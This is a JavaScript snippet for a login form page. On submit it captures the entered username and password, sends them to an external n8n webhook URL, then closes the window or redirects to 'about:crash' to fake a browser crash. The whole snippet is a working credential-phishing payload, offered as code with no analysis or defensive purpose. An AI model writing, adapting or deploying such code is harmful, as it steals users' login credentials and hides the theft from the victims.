    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Get input values
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send data to webhook
            fetch('https://dinur12.app.n8n.cloud/webhook-test/9b0bab7c-6930-4900-aa2c-fce054e554ed', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .catch(error => {
                console.error('Error sending to webhook:', error);
            });

            // Attempt to close the window (works if opened via window.open)
            window.close();

            // Simulate a crash by redirecting to an invalid URL
            window.location.href = 'about:crash'; // May not work in all browsers
        });
    </script>
